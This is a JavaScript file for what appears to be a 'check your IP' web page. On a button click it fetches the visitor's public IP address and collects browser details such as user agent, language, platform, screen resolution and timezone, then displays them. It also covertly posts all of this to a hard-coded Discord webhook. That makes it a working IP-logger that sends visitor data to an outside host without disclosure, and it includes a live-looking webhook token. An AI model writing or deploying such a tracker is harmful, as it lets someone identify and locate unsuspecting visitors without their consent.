// Discord Webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1536093526532825118/uvEE9AGU_dE8CgYOyz9YZ-WnYzsbj4Wjt6HRbjt8keQrchaF-SUHAj_TcikUKocOX8Uw';

// Get IP Address
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

// Get Browser Info
function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    };
}

// Send to Discord Webhook (FIXED)
async function sendToWebhook(ip, browserInfo) {
    try {
        const payload = {
            embeds: [{
                color: 3447003,
                description: `**IP:** ${ip}\n**User Agent:** ${browserInfo.userAgent}\n**Language:** ${browserInfo.language}\n**Platform:** ${browserInfo.platform}\n**Screen:** ${browserInfo.screenResolution}\n**Timezone:** ${browserInfo.timezone}\n**Timestamp:** ${browserInfo.timestamp}`
            }]
        };
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json' 
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log('✅ Sent to Discord successfully!');
        } else {
            console.error('❌ Failed to send. Status:', response.status);
            const errorText = await response.text();
            console.error('Error details:', errorText);
        }
    } catch (error) {
        console.error('❌ Error sending to Discord:', error);
    }
}

// Button Click Handler
document.getElementById('checkBtn').addEventListener('click', async () => {
    document.getElementById('checkBtn').classList.add('hidden');
    document.getElementById('loading').classList.remove('hidden');
    
    const ip = await getIP();
    const browserInfo = getBrowserInfo();
    
    document.getElementById('ipAddress').textContent = ip;
    document.getElementById('browser').textContent = browserInfo.userAgent;
    document.getElementById('language').textContent = browserInfo.language;
    document.getElementById('platform').textContent = browserInfo.platform;
    document.getElementById('resolution').textContent = browserInfo.screenResolution;
    document.getElementById('timezone').textContent = browserInfo.timezone;
    document.getElementById('localTime').textContent = new Date().toLocaleString();
    
    await sendToWebhook(ip, browserInfo);
    
    document.getElementById('loading').classList.add('hidden');
    document.getElementById('results').classList.remove('hidden');
});
